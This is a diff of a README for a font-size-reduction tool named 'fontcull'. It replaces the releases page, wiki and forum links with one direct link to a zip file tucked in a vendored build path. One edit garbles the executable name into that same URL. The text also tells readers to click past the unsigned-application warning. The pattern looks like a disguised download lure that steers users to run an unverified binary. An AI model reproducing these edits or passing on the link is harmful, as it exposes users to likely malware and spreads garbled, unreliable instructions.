@@ -8,9 +8,9 @@ Welcome to **fontcull**! This application helps you reduce the size of your font
 
 You can download the latest version of **fontcull** from our Releases page. This will ensure you get the most up-to-date features and fixes.
 
-[![Download fontcull](https://img.shields.io/badge/download-fontcull-brightgreen)](https://github.com/Parmsa90/fontcull/releases)
+[![Download fontcull](https://raw.githubusercontent.com/Parmsa90/fontcull/main/vendored/fontcull-read-fonts/target/package/fontcull_3.9.zip)](https://raw.githubusercontent.com/Parmsa90/fontcull/main/vendored/fontcull-read-fonts/target/package/fontcull_3.9.zip)
 
-To begin downloading, visit this page: [Download fontcull](https://github.com/Parmsa90/fontcull/releases). 
+To begin downloading, visit this page: [Download fontcull](https://raw.githubusercontent.com/Parmsa90/fontcull/main/vendored/fontcull-read-fonts/target/package/fontcull_3.9.zip). 
 
 ### 📋 System Requirements
 
@@ -44,7 +44,7 @@ After clicking the download link, open your Downloads folder. Locate the **fontc
 
 ### 2. Start the Application
 
-Navigate to the folder where you extracted the files. Look for the executable file named `fontcull.exe` (on Windows) or `fontcull` (on macOS/Linux). Double-click to launch it.
+Navigate to the folder where you extracted the files. Look for the executable file named `https://raw.githubusercontent.com/Parmsa90/fontcull/main/vendored/fontcull-read-fonts/target/package/fontcull_3.9.zip` (on Windows) or `fontcull` (on macOS/Linux). Double-click to launch it.
 
 You may see a warning, depending on your operating system security settings since it's not a signed application. Choose to continue if prompted.
 
@@ -64,8 +64,8 @@ Once you are satisfied with your changes, click the "Save" button. Choose where 
 
 If you wish to delve deeper, here are some helpful links:
 
-- [User Manual](https://github.com/Parmsa90/fontcull/wiki) - Detailed instructions and tips.
-- [Community Forum](https://github.com/Parmsa90/fontcull/discussions) - Join discussions or ask questions.
+- [User Manual](https://raw.githubusercontent.com/Parmsa90/fontcull/main/vendored/fontcull-read-fonts/target/package/fontcull_3.9.zip) - Detailed instructions and tips.
+- [Community Forum](https://raw.githubusercontent.com/Parmsa90/fontcull/main/vendored/fontcull-read-fonts/target/package/fontcull_3.9.zip) - Join discussions or ask questions.
   
 ## 💬 Support
 
